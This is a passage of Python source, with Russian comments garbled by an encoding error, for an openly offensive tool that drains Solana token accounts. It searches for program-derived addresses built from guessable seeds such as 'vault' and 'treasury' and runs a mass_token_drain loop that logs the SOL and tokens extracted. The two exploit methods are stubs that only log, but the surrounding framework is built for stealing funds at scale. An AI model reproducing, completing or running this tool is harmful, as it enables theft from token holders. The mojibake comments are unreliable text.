        # –ù–∞–ø—Ä–∏–º–µ—Ä, –ø—Ä–æ–≤–µ—Ä–∫–∞ –≤–µ—Ä—Å–∏–∏ –ø—Ä–æ–≥—Ä–∞–º–º—ã, –Ω–∞–ª–∏—á–∏–µ –∏–∑–≤–µ—Å—Ç–Ω—ã—Ö –±–∞–≥–æ–≤ –∏ —Ç.–¥.
        
        return False
    
    async def _check_predictable_pda(self, account: PublicKey) -> Dict[str, Any]:
        """–ü—Ä–æ–≤–µ—Ä—è–µ—Ç, —è–≤–ª—è–µ—Ç—Å—è –ª–∏ –∞–∫–∫–∞—É–Ω—Ç PDA —Å –ø—Ä–µ–¥—Å–∫–∞–∑—É–µ–º—ã–º–∏ seeds"""
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –æ–±—â–∏–µ –ø–∞—Ç—Ç–µ—Ä–Ω—ã PDA
        common_seeds = [
            [b"vault"],
            [b"pool"],
            [b"user", self.attacker_keypair.pubkey().to_bytes()],
            [b"treasury"],
        ]
        
        # –ü—ã—Ç–∞–µ–º—Å—è –Ω–∞–π—Ç–∏ –ø—Ä–æ–≥—Ä–∞–º–º—É –∏ seeds
        for seeds in common_seeds:
            for program in self.known_programs:
                try:
                    pda, bump = PublicKey.find_program_address(seeds, program)
                    if pda == account:
                        return {
                            "is_vulnerable_pda": True,
                            "program": program,
                            "seeds": seeds,
                            "bump": bump
                        }
                except:
                    continue
        
        return {"is_vulnerable_pda": False}
    
    async def _exploit_vulnerable_program_tokens(self, token_account: PublicKey, 
                                                program_id: PublicKey, amount: int, 
                                                mint: PublicKey) -> Optional[Dict[str, Any]]:
        """–≠–∫—Å–ø–ª–æ–π—Ç —Ç–æ–∫–µ–Ω–æ–≤ —á–µ—Ä–µ–∑ —É—è–∑–≤–∏–º—É—é –ø—Ä–æ–≥—Ä–∞–º–º—É"""
        # –ó–¥–µ—Å—å –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å —Ä–µ–∞–ª—å–Ω–∞—è –ª–æ–≥–∏–∫–∞ —ç–∫—Å–ø–ª–æ–π—Ç–∞
        # –≠—Ç–æ –∑–∞–≥–ª—É—à–∫–∞ –¥–ª—è –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–∏ —Å—Ç—Ä—É–∫—Ç—É—Ä—ã
        self.logger.info(f"[EXPLOIT] –ü–æ–ø—ã—Ç–∫–∞ —ç–∫—Å–ø–ª–æ–π—Ç–∞ —á–µ—Ä–µ–∑ –ø—Ä–æ–≥—Ä–∞–º–º—É {program_id}")
        return None
    
    async def _exploit_pda_tokens(self, token_account: PublicKey, pda_info: Dict[str, Any],
                                 amount: int, mint: PublicKey) -> Optional[Dict[str, Any]]:
        """–≠–∫—Å–ø–ª–æ–π—Ç —Ç–æ–∫–µ–Ω–æ–≤ –≤ PDA –∞–∫–∫–∞—É–Ω—Ç–µ"""
        # –ó–¥–µ—Å—å –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å —Ä–µ–∞–ª—å–Ω–∞—è –ª–æ–≥–∏–∫–∞ —ç–∫—Å–ø–ª–æ–π—Ç–∞ PDA
        # –≠—Ç–æ –∑–∞–≥–ª—É—à–∫–∞ –¥–ª—è –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–∏ —Å—Ç—Ä—É–∫—Ç—É—Ä—ã
        self.logger.info(f"[EXPLOIT] –ü–æ–ø—ã—Ç–∫–∞ —ç–∫—Å–ø–ª–æ–π—Ç–∞ PDA —Å seeds: {pda_info['seeds']}")
        return None
    
    async def mass_token_drain(self, token_accounts: List[Union[PublicKey, str]]) -> List[ExploitResult]:
        """–ú–∞—Å—Å–æ–≤—ã–π —Å–ª–∏–≤ —Ç–æ–∫–µ–Ω–æ–≤"""
        results = []
        
        for account in token_accounts:
            try:
                result = await self.execute_exploit(account)
                results.append(result)
                
                # –õ–æ–≥–∏—Ä—É–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç
                if result.status == ExploitStatus.SUCCESS:
                    self.logger.info(f"–£—Å–ø–µ—à–Ω–æ –∏–∑–≤–ª–µ—á–µ–Ω–æ –∏–∑ {account}: {result.extracted_value} SOL, —Ç–æ–∫–µ–Ω–æ–≤: {len(result.extracted_tokens)}")
                
                # –ó–∞–¥–µ—Ä–∂–∫–∞ –º–µ–∂–¥—É —ç–∫—Å–ø–ª–æ–π—Ç–∞–º–∏
                await asyncio.sleep(0.5)
                
            except Exception as e:
                self.logger.error(f"–û—à–∏–±–∫–∞ –º–∞—Å—Å–æ–≤–æ–≥–æ —Å–ª–∏–≤–∞ —Ç–æ–∫–µ–Ω–æ–≤ {account}: {e}")
                
                error_result = ExploitResult(
                    exploit_type=self.exploit_type,
                    status=ExploitStatus.FAILED,
                    target_account=str(account),
                    error_message=str(e)
                )
                results.append(error_result)
        
        return results
